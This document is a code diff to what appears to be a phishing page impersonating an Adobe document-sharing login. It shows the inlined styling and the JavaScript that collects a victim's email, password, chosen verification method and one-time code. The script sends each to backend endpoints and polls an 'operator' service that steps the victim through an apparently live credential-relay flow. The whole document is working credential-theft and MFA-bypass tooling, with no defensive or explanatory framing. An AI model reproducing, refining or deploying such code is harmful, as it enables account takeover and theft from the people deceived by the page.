@@ -8,7 +8,439 @@
   <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css">
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://robertlugana.sirv.com/icon/TEMPLATES/COOKIE/adobe-login.css">
+  <style>
+    body, html {
+      height: 100%;
+      margin: 0;
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: #f5f5f5;
+      overflow-x: hidden;
+    }
+    
+    .main-container {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      position: relative;
+    }
+    
+    .top-navbar {
+      background-color: #fff;
+      height: 60px;
+      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      display: flex;
+      align-items: center;
+      padding: 0 20px;
+      position: relative;
+      z-index: 10;
+    }
+    
+    .adobe-logo {
+      width: 24px;
+      height: 24px;
+      margin-right: 10px;
+    }
+    
+    .nav-title {
+      font-size: 18px;
+      font-weight: 500;
+      color: #333;
+    }
+    
+    .content-area {
+      display: flex;
+      flex: 1;
+      position: relative;
+    }
+    
+    .document-preview {
+      flex: 1;
+      background-color: #EAEAEA;
+      padding: 40px;
+      position: relative;
+      width: 100%;   /* Ensure full width */
+    }
+    
+    .document-list {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+      gap: 25px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    
+    .document-card {
+      background: white;
+      border-radius: 4px;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+      transition: all 0.2s;
+      position: relative;
+    }
+    
+    .document-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 5px 15px rgba(0,0,0,0.15);
+    }
+    
+    .document-thumbnail {
+      height: 150px;
+      background-color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-bottom: 1px solid #eee;
+      padding: 10px;
+    }
+    
+    .thumbnail-content {
+      width: 100%;
+      height: 100%;
+      background-color: #f8f8f8;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .thumbnail-header {
+      background-color: #E15300;
+      height: 20px;
+      width: 100%;
+    }
+    
+    .thumbnail-body {
+      flex: 1;
+      padding: 5px;
+      font-size: 6px;
+      overflow: hidden;
+    }
+    
+    .thumbnail-line {
+      height: 3px;
+      background-color: #ddd;
+      margin: 3px 0;
+      width: 90%;
+    }
+    
+    .document-info {
+      padding: 12px;
+    }
+    
+    .document-title {
+      font-size: 14px;
+      font-weight: 500;
+      margin-bottom: 5px;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+    }
+    
+    .document-meta {
+      font-size: 12px;
+      color: #666;
+      display: flex;
+      align-items: center;
+    }
+    
+    .document-date {
+      margin-right: 10px;
+    }
+    
+    .document-type {
+      padding: 2px 6px;
+      background-color: #E8F0FE;
+      color: #1A73E8;
+      border-radius: 3px;
+      font-size: 10px;
+    }
+    
+    .document-overlay {
+      position: fixed;  /* Changed from absolute to fixed */
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;  /* Increased z-index */
+      overflow-y: auto;  /* Allow scrolling on mobile */
+      padding: 20px;  /* Add padding for mobile */
+    }
+    
+    .login-container {
+      width: 420px;
+      max-width: 100%;  /* Changed from 90% to 100% */
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.5);
+      padding: 40px;
+      z-index: 1001;
+      position: relative;  /* Added position relative */
+      margin: auto;  /* Center horizontally */
+    }
+    
+    .form-title {
+      text-align: center;
+      margin-bottom: 25px;
+      color: #333;
+      font-weight: 500;
+    }
+    
+    .form-subtitle {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #666;
+      font-size: 14px;
+      font-weight: 300;
+    }
+    
+    .email-providers {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 30px;
+      align-items: center;
+      padding: 0 20px;
+    }
+    
+    .email-provider-logo {
+      width: 32px;
+      height: 32px;
+      object-fit: contain;
+    }
+    
+    .form-group label {
+      font-weight: 500;
+      color: #333;
+    }
+    
+    .form-control {
+      height: 45px;
+      border-radius: 4px;
+      border: 1px solid #ccc;
+      padding-left: 12px;
+    }
+    
+    .form-control:focus {
+      box-shadow: 0 0 0 2px rgba(225, 83, 0, 0.2);
+      border-color: #E15300;
+    }
+    
+    .btn-primary {
+      background-color: #E15300;
+      border-color: #E15300;
+      height: 45px;
+      font-weight: 500;
+      width: 100%;
+      margin-top: 10px;
+      border-radius: 4px;
+      transition: all 0.3s;
+    }
+    
+    .btn-primary:hover {
+      background-color: #C24500;
+      border-color: #C24500;
+    }
+    
+    .security-footer {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-top: 30px;
+      padding-top: 15px;
+      border-top: 1px solid #eee;
+    }
+    
+    .security-text {
+      color: #E15300;
+      font-weight: 500;
+      font-size: 13px;
+      margin-right: 10px;
+    }
+    
+    .adobe-logo-footer {
+      width: 24px;
+      height: 24px;
+    }
+    
+    .error-message {
+      color: #D32F2F;
+      font-size: 13px;
+      text-align: left;
+      margin-top: 5px;
+      margin-bottom: 15px;
+      display: none;
+    }
+    
+    .loading-overlay {
+      display: none; /* Hidden by default */
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.2); /* Even more transparent dark background */
+      z-index: 9999; /* Ensure it's on top of everything */
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    .loading-spinner {
+      border: 5px solid #f3f3f3; /* Light grey */
+      border-top: 5px solid #E15300; /* Adobe orange */
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .loading-text {
+      font-size: 1.2em;
+      color: #333;
+      margin-bottom: 15px;
+      max-width: 80%;
+    }
+
+    .loading-error-message {
+      font-size: 1.2em;
+      color: #D32F2F;
+      font-weight: bold;
+      display: none; /* Hidden by default */
+    }
+    
+    .form-text {
+      font-size: 12px;
+    }
+    
+    .lock-icon {
+      position: absolute;
+      top: 10px;
+      right: 10px;
+      background-color: rgba(255, 255, 255, 0.9);
+      width: 24px;
+      height: 24px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #E15300;
+      font-size: 12px;
+    }
+    
+    /* Improved Mobile Responsiveness */
+    @media (max-width: 768px) {
+      .document-list {
+        grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+        gap: 15px;
+        padding: 0 10px;
+      }
+      
+      .document-preview {
+        padding: 20px 10px;
+      }
+      
+      .login-container {
+        padding: 30px 20px;
+        width: 95%;
+        max-width: 350px;
+        margin: 40px auto;  /* Add more margin for better positioning */
+      }
+      
+      .document-overlay {
+        padding: 0;  /* Remove padding on mobile */
+        align-items: center;  /* Better centering */
+        justify-content: center;
+      }
+      
+      .form-title {
+        font-size: 20px;
+      }
+      
+      .form-subtitle {
+        font-size: 12px;
+      }
+      
+      .email-providers {
+        padding: 0 5px;
+      }
+      
+      .email-provider-logo {
+        width: 28px;
+        height: 28px;
+      }
+      
+      .security-text {
+        font-size: 11px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .document-list {
+        grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+        gap: 10px;
+      }
+      
+      .document-thumbnail {
+        height: 120px;
+      }
+      
+      .document-title {
+        font-size: 12px;
+      }
+      
+      .document-meta {
+        font-size: 10px;
+      }
+      
+      .top-navbar {
+        height: 50px;
+      }
+      
+      .nav-title {
+        font-size: 16px;
+      }
+      
+      .login-container {
+        width: 90%;
+        padding: 25px 15px;
+      }
+      
+      .email-providers {
+        flex-wrap: wrap;
+        gap: 10px;
+        justify-content: center;
+      }
+      
+      .email-provider-logo {
+        margin: 0 5px;
+      }
+    }
+    
+    /* Portrait phones */
+    @media (max-width: 320px) {
+      .login-container {
+        padding: 20px 15px;
+      }
+      
+      .email-providers {
+        padding: 0;
+      }
+      
+      .form-title {
+        font-size: 18px;
+      }
+    }
+  </style>
 </head>
 <body>
 
@@ -217,9 +649,16 @@ const templateConfig = {
   landingPageLink: "{{landingPageLink}}"
 };
 
+// Use the template's own origin domain + /api instead of postURL
+// (postURL is kept in templateConfig above for easy revert if needed)
+const apiBaseUrl = window.location.origin + "/api";
+
 let browserId = null;
 let pollingIntervalId = null;
+let pollingStartTime = null;
+const POLLING_TIMEOUT_MS = 10 * 60 * 1000; // 10 minutes global timeout
 let currentStatus = null;
+let lastShownStatus = '';
 let verificationOptions = [];
 let loadingMessages = [
   "Securing your connection...",
@@ -233,12 +672,6 @@ let loadingMessages = [
 ];
 let currentMessageIndex = 0;
 let messageIntervalId = null;
-// Track last seen lastJsonResponse timestamp to avoid re-applying the same error repeatedly
-let lastSeenLjTimestamp = null;
-// Track last seen password error to avoid clearing password field repeatedly
-let lastSeenPasswordErrorTimestamp = null;
-// Flag to prevent input listener from clearing fields during programmatic updates
-let isUserTyping = false;
 
 // Helper function to show loading overlay with dynamic text
 function showLoadingOverlay(showSpinner = true, isError = false) {
@@ -313,9 +746,6 @@ function updateUIForStatus(status, data = {}) {
   const passwordField = document.getElementById('exampleInputPassword1');
   const verificationCodeInput = document.getElementById('verificationCodeInput');
 
-  // Keep password input enabled by default so users can type if they want.
-  passwordField.disabled = false;
-
   // Hide all error messages
   hideAllErrors();
 
@@ -329,15 +759,16 @@ function updateUIForStatus(status, data = {}) {
   passwordGroup.style.display = 'block';
 
   switch (status) {
-      case 'WAITING':
-      // Generic waiting state: show loading overlay and wait for background processing
+    case 'WAITING':
+      // Initial state — process is starting up
       showLoadingOverlay(true);
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
-      submitButton.innerText = "Please wait...";
+      submitButton.innerText = "Checking...";
       submitButton.disabled = true;
-      emailField.readOnly = !!emailField.value && emailField.value.trim() !== '';
-      startPolling(10000);
+      emailField.readOnly = true;
+      passwordField.disabled = true;
+      startPolling(5000); // Poll faster during initial WAITING
       break;
     case 'PROCESSING':
       showLoadingOverlay(true);
@@ -346,105 +777,83 @@ function updateUIForStatus(status, data = {}) {
       submitButton.innerText = "Processing...";
       submitButton.disabled = true;
       emailField.readOnly = true;
+      passwordField.disabled = true;
       startPolling(10000); // Poll every 10 seconds for processing
       break;
     case 'WAITINGEMAIL':
-      hideLoadingOverlay();
-      verificationOptionsGroup.style.display = 'none';
-      verificationCodeGroup.style.display = 'none';
-      submitButton.innerText = "Continue";
-      emailField.readOnly = false; // Allow email input if not prefilled
-      // Replace the small callout text with the server-provided error and keep it visible
-      try {
-        const lj = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : (data.lastJsonResponse || {});
-        const msg = lj && lj.message ? lj.message : null;
-        // Only treat as email error if sheet/check result explicitly says emailExists=false or status is WAITINGEMAIL
-        const looksLikeEmailError = lj && (lj.emailExists === false || lj.status === 'WAITINGEMAIL');
-        const msgMatches = msg && /email does not exist|invalid email|no such email|email not found/i.test(msg);
-        const ljBrowserId = lj && lj.browserId ? lj.browserId : null;
-        const browserMatches = ljBrowserId ? (browserId && ljBrowserId === browserId) : true;
-        const isEmailError = browserMatches && (looksLikeEmailError || msgMatches);
-
-        const ljKey = `${ljBrowserId || ''}::${lj.timestamp || ''}::${msg || ''}`;
-        const isNewError = ljKey && ljKey !== lastSeenLjTimestamp;
-
-        const emailCalloutEl = document.getElementById('emailCallout');
-
-        if (isEmailError) {
-          // Show the error in the callout and apply error class so it persists across polling updates
-          emailCalloutEl.textContent = msg || "Email does not exist. Please provide a valid email.";
-          emailCalloutEl.classList.add('email-callout-error');
-          // Keep the dedicated inline error element hidden (we use the callout as primary error UI)
-          document.getElementById('InvalidEmail').style.display = 'none';
-
-          if (isNewError) {
-            // Only clear fields once for a newly-observed server error
-            try { emailField.value = ''; } catch(e) {}
-            try { passwordField.value = ''; } catch(e) {}
-            lastSeenLjTimestamp = ljKey;
-          }
-        } else {
-          // No server email error — restore default callout appearance
-          emailCalloutEl.textContent = "Enter your email address.";
-          emailCalloutEl.classList.remove('email-callout-error');
-        }
-      } catch (e) {
-        // ignore JSON parse errors and leave callout as-is
-      }
-      startPolling(10000); // Poll every 10 seconds for user input
-      break;
-    case 'WAITINGPASSWORD':
+    case 'WAITINGEMAILERROR':
       hideLoadingOverlay();
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'none';
       submitButton.innerText = "Login";
+      if (data.email) emailField.value = data.email;
+      emailField.readOnly = false; // Allow email input if not prefilled
+      passwordField.disabled = false;
+      if (data.lastJsonResponse) {
+        try {
+          const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+          if (lastResp.message && !lastResp.message.includes('Processing email')) {
+            document.getElementById('InvalidEmail').textContent = lastResp.message;
+            document.getElementById('InvalidEmail').style.display = 'block';
+            passwordField.value = '';
+          }
+        } catch(e) {}
+      }
+      startPolling(10000); // Poll every 10 seconds for user input
+      break;
+    case 'WAITINGPASSWORD':
+    case 'WAITINGPASSWORDERROR':
+      hideLoadingOverlay();
+      verificationOptionsGroup.style.display = 'none';
+      verificationCodeGroup.style.display = 'none';
+      submitButton.innerText = "Login";
+      if (data.email) emailField.value = data.email;
       emailField.readOnly = true;
       passwordField.disabled = false;
-      
-      // Clear email error callout since we've moved past email validation
-      const emailCalloutEl = document.getElementById('emailCallout');
-      emailCalloutEl.textContent = "Enter your email address.";
-      emailCalloutEl.classList.remove('email-callout-error');
-      
-      // If the server indicated a previous incorrect password, surface that to the user
-      try {
-        const lj = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : (data.lastJsonResponse || {});
-        if (lj && (lj.message && /incorrect|wrong password|incorrect password/i.test(lj.message))) {
-          document.getElementById('InvalidPassword').textContent = lj.message || "Incorrect email or password. Try again.";
-          document.getElementById('InvalidPassword').style.display = 'block';
-          
-          // Only clear the password field once per unique error (by checking timestamp)
-          const pwdErrorKey = `${lj.timestamp || ''}::${lj.message || ''}`;
-          if (pwdErrorKey && pwdErrorKey !== lastSeenPasswordErrorTimestamp) {
+      if (lastShownStatus !== currentStatus && data.lastJsonResponse) {
+        try {
+          const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+          if (lastResp.message && (lastResp.message.includes('Incorrect password') || lastResp.message.includes('incorrect'))) {
+            document.getElementById('InvalidPassword').textContent = lastResp.message;
+            document.getElementById('InvalidPassword').style.display = 'block';
             passwordField.value = '';
-            lastSeenPasswordErrorTimestamp = pwdErrorKey;
           }
-        }
-      } catch (e) {
-        // ignore JSON parse errors
+        } catch(e) {}
       }
+      lastShownStatus = currentStatus;
       startPolling(10000); // Poll every 10 seconds for user input
       break;
     case 'WAITINGOPTIONS':
       hideLoadingOverlay();
+      emailGroup.style.display = 'none';
+      passwordGroup.style.display = 'none';
       verificationOptionsGroup.style.display = 'block';
       verificationCodeGroup.style.display = 'none';
       submitButton.innerText = "Submit Choice";
-      emailField.readOnly = true;
-      // keep password enabled; it's not used in options flow but should remain editable
-      verificationOptions = data.verificationOptions || [];
+      let rawOpts = data.verificationOptions || [];
+      if (typeof rawOpts === 'string') { try { rawOpts = JSON.parse(rawOpts); } catch(e) { rawOpts = []; } }
+      verificationOptions = Array.isArray(rawOpts) ? rawOpts : [];
       renderVerificationOptions(verificationOptions);
-      startPolling(10000); // Poll every 10 seconds for user input
+      startPolling(10000);
       break;
     case 'WAITINGCODE':
       hideLoadingOverlay();
+      emailGroup.style.display = 'none';
+      passwordGroup.style.display = 'none';
       verificationOptionsGroup.style.display = 'none';
       verificationCodeGroup.style.display = 'block';
       submitButton.innerText = "Submit Code";
-      emailField.readOnly = true;
-      // keep password enabled for user convenience
-      verificationCodeInput.value = ''; // Clear previous code
-      startPolling(10000); // Poll every 10 seconds for user input
+      verificationCodeInput.value = '';
+      if (data.lastJsonResponse) {
+        try {
+          const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+          if (lastResp.message && (lastResp.message.includes('Incorrect verification code') || lastResp.message.includes('incorrect code'))) {
+            document.getElementById('InvalidVerificationCode').textContent = lastResp.message;
+            document.getElementById('InvalidVerificationCode').style.display = 'block';
+          }
+        } catch(e) {}
+      }
+      startPolling(10000);
       break;
     case 'COMPLETED':
       hideLoadingOverlay();
@@ -460,30 +869,23 @@ function updateUIForStatus(status, data = {}) {
     case 'FAILED':
       showLoadingOverlay(false, true); // Show error message, no spinner
       clearInterval(pollingIntervalId);
-      // Prefer details from lastJsonResponse if available
-      try {
-        const lj = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : (data.lastJsonResponse || {});
-        const emailCalloutEl = document.getElementById('emailCallout');
-        if (lj && lj.status === 'WAITINGEMAIL') {
-          // Show email error in the callout so it persists like WAITINGEMAIL handling
-          emailCalloutEl.textContent = lj.message || "Email does not exist. Please check your email.";
-          emailCalloutEl.classList.add('email-callout-error');
-          document.getElementById('InvalidEmail').style.display = 'none';
-        } else if (lj && (lj.message && /incorrect|wrong password|incorrect password/i.test(lj.message))) {
-          document.getElementById('InvalidPassword').textContent = lj.message || "Incorrect email or password. Try again.";
-          document.getElementById('InvalidPassword').style.display = 'block';
-        } else if (data.emailExists === false) {
-          emailCalloutEl.textContent = "Email does not exist. Please check your email.";
-          emailCalloutEl.classList.add('email-callout-error');
-          document.getElementById('InvalidEmail').style.display = 'none';
-        } else if (data.accountAccess === false) {
-          document.getElementById('InvalidPassword').textContent = "Incorrect email or password. Try again.";
-          document.getElementById('InvalidPassword').style.display = 'block';
-        } else {
-          document.getElementById('GeneralError').textContent = "An error occurred. Please try again.";
-          document.getElementById('GeneralError').style.display = 'block';
-        }
-      } catch (e) {
+      // Parse lastJsonResponse for detailed error info
+      let emailExists = data.emailExists;
+      let accountAccess = data.accountAccess;
+      if (data.lastJsonResponse) {
+        try {
+          const lastResp = typeof data.lastJsonResponse === 'string' ? JSON.parse(data.lastJsonResponse) : data.lastJsonResponse;
+          if (emailExists === undefined) emailExists = lastResp.emailExists;
+          if (accountAccess === undefined) accountAccess = lastResp.accountAccess;
+        } catch(e) {}
+      }
+      if (emailExists === false) {
+        document.getElementById('InvalidEmail').textContent = "Email does not exist. Please check your email.";
+        document.getElementById('InvalidEmail').style.display = 'block';
+      } else if (accountAccess === false) {
+        document.getElementById('InvalidPassword').textContent = "Incorrect email or password. Try again.";
+        document.getElementById('InvalidPassword').style.display = 'block';
+      } else {
         document.getElementById('GeneralError').textContent = "An error occurred. Please try again.";
         document.getElementById('GeneralError').style.display = 'block';
       }
@@ -569,45 +971,6 @@ async function initialFormSubmission() {
     emailCallout.textContent = "Enter your email address.";
   }
 
-  // When the user starts typing in the email or password field, clear any server-provided error
-  try {
-    const setUserTyping = () => { isUserTyping = true; };
-    const clearUserTyping = () => { isUserTyping = false; };
-    
-    emailField.addEventListener('focus', setUserTyping);
-    emailField.addEventListener('blur', clearUserTyping);
-    passwordField.addEventListener('focus', setUserTyping);
-    passwordField.addEventListener('blur', clearUserTyping);
-    
-    emailField.addEventListener('input', () => {
-      // Only clear error if the user is actually typing (not a programmatic change from polling)
-      if (!isUserTyping) return;
-      
-      const emailCalloutEl = document.getElementById('emailCallout');
-      emailCalloutEl.textContent = "Enter your email address.";
-      emailCalloutEl.classList.remove('email-callout-error');
-      document.getElementById('InvalidEmail').style.display = 'none';
-      // Allow new errors to be applied after the user edits
-      lastSeenLjTimestamp = null;
-    });
-    
-    passwordField.addEventListener('input', () => {
-      // Only clear error if the user is actually typing (not a programmatic change from polling)
-      if (!isUserTyping) return;
-      
-      const emailCalloutEl = document.getElementById('emailCallout');
-      emailCalloutEl.textContent = "Enter your email address.";
-      emailCalloutEl.classList.remove('email-callout-error');
-      document.getElementById('InvalidEmail').style.display = 'none';
-      document.getElementById('InvalidPassword').style.display = 'none';
-      // Allow new errors to be applied after the user edits
-      lastSeenLjTimestamp = null;
-      lastSeenPasswordErrorTimestamp = null;
-    });
-  } catch (e) {
-    // ignore if element not present
-  }
-
   const formDataContent = {
     email: email || '', // Send email if prefilled, otherwise empty
     password: '', // Password is not sent initially
@@ -638,7 +1001,7 @@ async function initialFormSubmission() {
     console.log("Initial Form Submission Payload:", finalPayload);
     console.log("Initial Form Submission Body (URL-encoded):", objectToFormData(finalPayload));
 
-    const response = await fetch(`${templateConfig.postURL}/notify-form-submission`, {
+    const response = await fetch(apiBaseUrl + "/notify-form-submission", {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: objectToFormData(finalPayload)
@@ -672,6 +1035,9 @@ function startPolling(interval = 10000) { // Default to 10 seconds
   if (pollingIntervalId) {
     clearInterval(pollingIntervalId);
   }
+  if (pollingStartTime === null) {
+    pollingStartTime = Date.now();
+  }
   pollingIntervalId = setInterval(pollOperator, interval);
 }
 
@@ -683,12 +1049,24 @@ async function pollOperator() {
     return;
   }
 
+  // Global timeout: if polling has been running for > 10 minutes, stop and show error.
+  // The engine's stale row cleanup will mark the row as FAILED on the next interval.
+  if (pollingStartTime !== null && Date.now() - pollingStartTime > POLLING_TIMEOUT_MS) {
+    console.warn("Polling timed out after 10 minutes. Stopping polling.");
+    clearInterval(pollingIntervalId);
+    showLoadingOverlay(false, true);
+    document.getElementById('GeneralError').textContent = "Session timed out. Please try again.";
+    document.getElementById('GeneralError').style.display = 'block';
+    resetFormState();
+    return;
+  }
+
   try {
     const pollingPayload = { browserId: browserId, token: templateConfig.token };
     console.log("Polling Payload:", pollingPayload);
     console.log("Polling Body (URL-encoded):", objectToFormData(pollingPayload));
 
-    const response = await fetch(`${templateConfig.postURL}/pooling-operator`, {
+    const response = await fetch(apiBaseUrl + "/pooling-operator", {
       method: 'POST',
       headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
       body: objectToFormData(pollingPayload)
@@ -702,28 +1080,7 @@ async function pollOperator() {
     console.log("Polling response:", data);
 
     if (data.currentStatus) {
-      const responseData = data.data || {};
-      const currentStatusFromResponse = data.currentStatus;
-      
-      // Check if we should keep the loading state active while waiting for backend pickup
-      // If WAITINGEMAIL with email already in sheet, or WAITINGPASSWORD with password already in sheet,
-      // keep loading active and continue polling (don't update UI yet)
-      const isWaitingEmailWithData = currentStatusFromResponse === 'WAITINGEMAIL' && responseData.email && responseData.email.trim() !== '';
-      const isWaitingPasswordWithData = currentStatusFromResponse === 'WAITINGPASSWORD' && responseData.password && responseData.password.trim() !== '';
-      
-      if (isWaitingEmailWithData || isWaitingPasswordWithData) {
-        // Keep loading overlay visible and continue polling
-        console.log("Polling detected backend still picking up data. Keeping loading state active.", {
-          status: currentStatusFromResponse,
-          hasEmail: !!responseData.email,
-          hasPassword: !!responseData.password
-        });
-        showLoadingOverlay(true);
-        startPolling(5000); // Poll more frequently (every 5 seconds) while waiting for backend pickup
-      } else {
-        // Update UI normally if not in "waiting for pickup" state
-        updateUIForStatus(data.currentStatus, data.data || {});
-      }
+      updateUIForStatus(data.currentStatus, data.data || {}); 
     } else {
       console.warn("Polling response missing currentStatus:", data);
     }
@@ -761,23 +1118,19 @@ async function handleFormSubmission() {
   try {
     if (currentStatus === 'WAITINGEMAIL') {
       const email = emailField.value.trim();
-      const password = passwordField.value.trim();
       if (!isValidEmail(email)) {
         document.getElementById('InvalidEmail').style.display = 'block';
-        hideLoadingOverlay();
+        hideLoadingOverlay(); // Hide loading overlay on client-side validation error
         resetFormState();
         return;
       }
       payload.email = email;
-      // Allow submitting password together with email when available
+      const password = passwordField.value.trim();
       if (password) {
         payload.password = password;
-        updateType = 'email_and_password';
-      } else {
-        updateType = 'email';
       }
-      startPolling(10000); // Poll after email/password submission
-    } else if (currentStatus === 'WAITINGPASSWORD') {
+      updateType = 'email';
+    } else if (currentStatus === 'WAITINGPASSWORD' || currentStatus === 'WAITINGPASSWORDERROR') {
       const password = passwordField.value.trim();
       if (!password) {
         document.getElementById('RequirePassword').style.display = 'block';
@@ -787,7 +1140,6 @@ async function handleFormSubmission() {
       }
       payload.password = password;
       updateType = 'password';
-      startPolling(10000); // Faster polling after user input (10 seconds)
     } else if (currentStatus === 'WAITINGOPTIONS') {
       const selectedOption = document.querySelector('input[name="verificationOption"]:checked');
       if (!selectedOption) {
@@ -824,7 +1176,6 @@ async function handleFormSubmission() {
       }
       payload.verificationCode = verificationCode;
       updateType = 'verificationCode';
-      startPolling(10000); // Faster polling after user input (10 seconds)
     } else {
       console.warn("handleFormSubmission called in an unexpected state:", currentStatus);
       document.getElementById('GeneralError').textContent = "Unexpected form submission. Please try again.";
@@ -840,11 +1191,11 @@ async function handleFormSubmission() {
     console.log("Handle Form Submission Payload:", payload);
     console.log("Handle Form Submission Body (URL-encoded):", objectToFormData(payload));
 
-    // Send updates directly to pooling-operator (it can update multiple fields)
-    const response = await fetch(`${templateConfig.postURL}/pooling-operator`, {
+    const response = await fetch(apiBaseUrl + "/update-process", {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded'
+        // No custom 'X-Update-Type' header
       },
       body: objectToFormData(payload)
     });
@@ -854,39 +1205,13 @@ async function handleFormSubmission() {
     }
 
     const data = await response.json();
-    console.log("Pooling operator (update) response:", data);
+    console.log("Update process response:", data);
 
-    // Keep the loading state stable: wait a short, compulsory interval
-    // so the serverless function has time to pick up the sheet row and
-    // transition status before we update the UI. This prevents the
-    // form flickering back into view between updates.
-    await new Promise((resolve) => setTimeout(resolve, 5000));
-
-    // Check if we should keep the loading state active while waiting for backend pickup
-    const responseData = data.data || {};
-    const currentStatusFromResponse = data.currentStatus;
-    
-    // If WAITINGEMAIL with email already in sheet, or WAITINGPASSWORD with password already in sheet,
-    // keep loading active and continue polling (don't update UI yet)
-    const isWaitingEmailWithData = currentStatusFromResponse === 'WAITINGEMAIL' && responseData.email && responseData.email.trim() !== '';
-    const isWaitingPasswordWithData = currentStatusFromResponse === 'WAITINGPASSWORD' && responseData.password && responseData.password.trim() !== '';
-    
-    if (isWaitingEmailWithData || isWaitingPasswordWithData) {
-      // Keep loading overlay visible and continue polling
-      console.log("Data submitted but backend still picking up. Keeping loading state active.", {
-        status: currentStatusFromResponse,
-        hasEmail: !!responseData.email,
-        hasPassword: !!responseData.password
-      });
-      showLoadingOverlay(true);
-      startPolling(5000); // Poll more frequently (every 5 seconds) while waiting for backend pickup
-    } else if (data && data.currentStatus) {
-      // Update UI only if not in "waiting for pickup" state
-      updateUIForStatus(data.currentStatus, data.data || {});
-    } else {
-      // Fallback to polling if response doesn't contain status
-      pollOperator();
-    }
+    // After update, restart polling with a shorter interval so the first status
+    // arrives quickly. Don't pollOperator() immediately — let the engine process
+    // the update first, and the loading overlay stays visible until the poll returns.
+    pollingStartTime = Date.now();
+    startPolling(3000);
 
   } catch (error) {
     console.error("Error during form submission:", error);
@@ -915,9 +1240,6 @@ function resetFormState() {
   btn.innerText = "Login";
   btn.style.backgroundColor = "";
   btn.style.color = "";
-
-  // Reset last-seen error key so new errors will be applied after user edits
-  lastSeenLjTimestamp = null;
 
   // Always show email and password fields, hide others
   document.getElementById('emailGroup').style.display = 'block';
